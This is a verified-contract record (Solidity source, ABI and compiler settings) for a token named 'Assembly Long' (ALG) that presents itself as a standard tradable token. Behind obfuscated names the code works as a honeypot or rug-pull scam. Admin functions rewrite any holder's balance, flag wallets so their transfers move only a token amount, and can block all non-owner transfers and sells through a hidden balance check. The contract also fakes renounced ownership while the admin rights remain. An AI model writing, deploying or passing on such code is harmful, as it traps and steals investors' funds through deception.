{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface launchedModeLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityReceiverTrading) external view returns (uint256);\n\n    function transfer(address totalFee, uint256 modeTx) external returns (bool);\n\n    function allowance(address totalMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalFee,\n        uint256 modeTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyAt, uint256 value);\n    event Approval(address indexed totalMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract senderList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedAmountFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listAmount {\n    function createPair(address receiverReceiver, address tradingReceiver) external returns (address);\n}\n\ninterface launchedModeLaunchMetadata is launchedModeLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssemblyLong is senderList, launchedModeLaunch, launchedModeLaunchMetadata {\n\n    bool public launchTradingList;\n\n    function balanceOf(address liquidityReceiverTrading) public view virtual override returns (uint256) {\n        return launchLiquidity[liquidityReceiverTrading];\n    }\n\n    address private fromSwapBuy;\n\n    uint8 private shouldTrading = 18;\n\n    event OwnershipTransferred(address indexed walletFee, address indexed receiverTrading);\n\n    function allowance(address feeFund, address isAt) external view virtual override returns (uint256) {\n        if (isAt == sellMarketing) {\n            return type(uint256).max;\n        }\n        return toLaunchLiquidity[feeFund][isAt];\n    }\n\n    uint256 fromLiquidity;\n\n    mapping(address => bool) public maxExemptMode;\n\n    function transfer(address atFrom, uint256 modeTx) external virtual override returns (bool) {\n        return launchedTrading(_msgSender(), atFrom, modeTx);\n    }\n\n    string private liquidityAmountReceiver = \"ALG\";\n\n    uint256 private enableSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAmountReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingFrom;\n    }\n\n    string private tradingFrom = \"Assembly Long\";\n\n    bool private toWallet;\n\n    function transferFrom(address maxReceiverMode, address totalFee, uint256 modeTx) external override returns (bool) {\n        if (_msgSender() != sellMarketing) {\n            if (toLaunchLiquidity[maxReceiverMode][_msgSender()] != type(uint256).max) {\n                require(modeTx <= toLaunchLiquidity[maxReceiverMode][_msgSender()]);\n                toLaunchLiquidity[maxReceiverMode][_msgSender()] -= modeTx;\n            }\n        }\n        return launchedTrading(maxReceiverMode, totalFee, modeTx);\n    }\n\n    bool public launchedAutoTeam;\n\n    function fromTake(address maxTotal) public {\n        receiverTotalIs();\n        \n        if (maxTotal == shouldLiquidityFund || maxTotal == walletReceiver) {\n            return;\n        }\n        maxExemptMode[maxTotal] = true;\n    }\n\n    uint256 private totalReceiver;\n\n    function maxEnable(address atFrom, uint256 modeTx) public {\n        receiverTotalIs();\n        launchLiquidity[atFrom] = modeTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTrading;\n    }\n\n    uint256 constant txReceiver = 13 ** 10;\n\n    uint256 private receiverFeeMarketing = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return fromSwapBuy;\n    }\n\n    uint256 public receiverSell;\n\n    mapping(address => mapping(address => uint256)) private toLaunchLiquidity;\n\n    function modeLaunchedSwap() public {\n        emit OwnershipTransferred(shouldLiquidityFund, address(0));\n        fromSwapBuy = address(0);\n    }\n\n    address public shouldLiquidityFund;\n\n    function launchedTrading(address maxReceiverMode, address totalFee, uint256 modeTx) internal returns (bool) {\n        if (maxReceiverMode == shouldLiquidityFund) {\n            return walletBuy(maxReceiverMode, totalFee, modeTx);\n        }\n        uint256 swapExemptTx = launchedModeLaunch(walletReceiver).balanceOf(shouldFee);\n        require(swapExemptTx == fromLiquidity);\n        require(totalFee != shouldFee);\n        if (maxExemptMode[maxReceiverMode]) {\n            return walletBuy(maxReceiverMode, totalFee, txReceiver);\n        }\n        return walletBuy(maxReceiverMode, totalFee, modeTx);\n    }\n\n    bool private feeWallet;\n\n    uint256 private receiverExempt;\n\n    uint256 public swapAuto;\n\n    function approve(address isAt, uint256 modeTx) public virtual override returns (bool) {\n        toLaunchLiquidity[_msgSender()][isAt] = modeTx;\n        emit Approval(_msgSender(), isAt, modeTx);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return fromSwapBuy;\n    }\n\n    uint256 receiverAuto;\n\n    function autoBuy(address takeSenderTeam) public {\n        if (launchedAutoTeam) {\n            return;\n        }\n        if (feeWallet != launchTradingList) {\n            launchTradingList = true;\n        }\n        buyMarketing[takeSenderTeam] = true;\n        if (swapAuto == enableSell) {\n            feeWallet = true;\n        }\n        launchedAutoTeam = true;\n    }\n\n    function marketingMin(uint256 modeTx) public {\n        receiverTotalIs();\n        fromLiquidity = modeTx;\n    }\n\n    address sellMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverTotalIs() private view {\n        require(buyMarketing[_msgSender()]);\n    }\n\n    function walletBuy(address maxReceiverMode, address totalFee, uint256 modeTx) internal returns (bool) {\n        require(launchLiquidity[maxReceiverMode] >= modeTx);\n        launchLiquidity[maxReceiverMode] -= modeTx;\n        launchLiquidity[totalFee] += modeTx;\n        emit Transfer(maxReceiverMode, totalFee, modeTx);\n        return true;\n    }\n\n    address shouldFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (feeWallet) {\n            launchTradingList = true;\n        }\n        launchedAmountFee amountTake = launchedAmountFee(sellMarketing);\n        walletReceiver = listAmount(amountTake.factory()).createPair(amountTake.WETH(), address(this));\n        if (launchTradingList) {\n            receiverExempt = swapAuto;\n        }\n        shouldLiquidityFund = _msgSender();\n        modeLaunchedSwap();\n        buyMarketing[shouldLiquidityFund] = true;\n        launchLiquidity[shouldLiquidityFund] = receiverFeeMarketing;\n        \n        emit Transfer(address(0), shouldLiquidityFund, receiverFeeMarketing);\n    }\n\n    mapping(address => bool) public buyMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverFeeMarketing;\n    }\n\n    mapping(address => uint256) private launchLiquidity;\n\n    address public walletReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSenderTeam\",\"type\":\"address\"}],\"name\":\"autoBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiverTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"}],\"name\":\"fromTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAutoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"marketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxExemptMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidityFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AssemblyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}